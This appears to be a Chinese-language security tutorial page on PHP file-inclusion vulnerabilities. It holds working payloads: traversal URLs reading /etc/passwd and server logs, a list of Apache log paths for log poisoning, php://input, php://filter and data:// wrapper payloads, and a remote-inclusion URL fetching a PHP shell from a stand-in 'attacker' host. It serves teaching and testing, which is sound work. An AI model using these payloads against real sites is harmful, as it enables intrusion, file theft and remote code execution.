---
layout: default
---
# ![](../img/hj.jpg)文件包含漏洞

## ![](../img/github19.png)本地文件包含
#### 包含用户上传的文件
这是最简单的方法(条件:未配置open_basedir）

如果包含了php代码，那么这些代码被include()加载后执行

但需要上传php文件才行，需结合上传漏洞
#### 包含data://或php://input等协议
要求：服务器支持且allow_url_include设置为on，且未配置open_basedir;
php 5.2.0后版本支持data：伪协议
举例：
```
http://www.example.com/index.php?file=data:text/plain,<?php phpinfo();?>%00
```
#### 包含Session
条件：需要攻击者能控制部分Session文件的内容，且未配置open_basedir
比如：
```
xls:19:"<?php phpinfo();?>
PHP默认生成的Session文件往往存放在/tmp/下，比如/temp/sess_SESSIONID
```
#### 包含日志文件
这个技巧比较通用(条件:未配置open_basedir）

原理：服务器会往Web Server的access_log里记录客户的请求信息，在error_log里记录出错请求，攻击者可以间接地将php代码写入到日志文件中，文件包含时，只需要包含日志文件即可。
（凌晨时包含日志文件成功性会高些，因为此时日志很小）

找到日志文件所在目录:

通过读取httpd的配置文件httpd.conf找日志文件所在目录

httpd.conf一般会存在Apache的安装目录下

在Redhat系列，默认安装可能在/etc/httpd/conf/httpd.conf

而自定义安装的可能在/usr/local/apache/conf/httpd.conf

如果猜不到httpd目录和日志目录，可以构造一些异常也许能暴露web目录所在位置

常见的日志文件可能存在的地方：
```
/var/log/httpd/access_log
/var/log/httpd/error_log

/etc/httpd/logs/acces_log             (书上的确只有一个s)
/etc/httpd/logs/acces.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log

/var/www/logs/access_log
/var/www/logs/access.log
/var/www/logs/error_log
/var/www/logs/error.log

/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/logs/error_log
/usr/local/apache/logs/error.log

/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log

/var/log/access_log
/var/log/access.log
/var/log/error_log
/var/log/error.log

../apache/logs/error.log
../apache/logs/access.log

../../apache/logs/access.log
../../apache/logs/error.log

../../../apache/logs/access.log
../../../apache/logs/error.log

../../../../../../../../../../var/log/httpd/access_log
../../../../../../../../../../var/log/httpd/error_log

../../../../../../../../../../etc/httpd//logs/access_log
../../../../../../../../../../etc/httpd//logs/access.log
../../../../../../../../../../etc/httpd//logs/error_log
../../../../../../../../../../etc/httpd//logs/error.log

../../../../../../../../../../var/www/logs/access_log
../../../../../../../../../../var/www/logs/access.log
../../../../../../../../../../var/www/logs/error_log
../../../../../../../../../../var/www/logs/error.log

../../../../../../../../../../usr/local/apache/logs/access_log
../../../../../../../../../../usr/local/apache/logs/access.log
../../../../../../../../../../usr/local/apache/logs/error_log
../../../../../../../../../../usr/local/apache/logs/error.log

../../../../../../../../../../var/log/apache/access_log
../../../../../../../../../../var/log/apache/access.log
../../../../../../../../../../var/log/apache/error_log
../../../../../../../../../../var/log/apache/error.log

../../../../../../../../../../var/log/access_log
../../../../../../../../../../var/log/error_log
```
#### 包含/proc/self/environ文件
这是一个更通用的方法，不需要猜测路径
```
http://www.website.com/view.php?page=../../../../../proc/self/environ
```
(条件:未配置open_basedir）
#### 包含上传的临时文件（RFC1867）
#### 包含其他应用创建的文件
如数据库文件，缓存文件，应用日志等

## ![](../img/github20.png)远程文件包含
举例：
```
<?php>
if ($route == "share"){
require_once $basePath . '/action/m_share.php';}
elseif ($route == "sharelink"){
require_once $basePath . '/action/m_sharelink.php';}

可构造url:/?param=http://attacker/phpshell.txt?
则代码执行require_once ‘http://attacker/phpshell.txt?/action/m_share.php'
？后面的代码被解释称querystring，也是一种截断，也可以换成%00
```
远程文件包含也可以执行命令，比如上面的phpshell.txt的内容如果是：
```
<?php echo system("ver;");?>
```
#### 远程代码执行
```
?file=[http|https|ftp]://example.com/shell.txt
(需要allow_url_fopen=On并且 allow_url_include=On)
```
#### 利用php://input
(接受POST过来的值，可用hackbar的post栏里写入<?php phpinfo(); ?>)：
```
网址写：http://hello.com/world.php?file=php://input,这样就可以显示phpinfo了
```
(需要allow_url_include=On)

#### 利用php://filter
(过滤器,可以用来读取php文件内容,不需要开启allow_url_include)：
```
	?file=php://filter/convert.base64-encode/resource=index.php
```
#### 利用data://
?file=data://text/plain;base64,base64编码的payload
```
如：?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
```
(需要allow_url_include=On,注意，PD9waHAgcGhwaW5mbygpOw==解码为<?php phpinfo();不能有闭合?>)
## ![](../img/github21.png)文件包含截断
```
%00截断(php版本小于5.3)
如：http://hello.com/1.php?a=2.txt%00
      http://hello.com/1.php?a=/etc/passwd%00
(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)
%00截断目录遍历：
 如/var/www/%00
 (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)
问号截断(问号后面相当于请求的参数，伪截断)
如 http://hello.com/test/123.php?f=http://remotehost.com/test/test.txt?id=
或者直接？： http://hello.com/test/123.php?f=http://remotehost.com/test/test.txt?  (test.txt内容为phpinfo代码)
英文(.) 反斜杠(/) 截断
长度截断：
windows下256个字节，linux下4096个字节时会达到最大值，最大长度之后的字符会被丢弃，用./构造长度如：
./././././././././././././././././abc
```
## ![](../img/github22.png)通过编码达到目录遍历

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
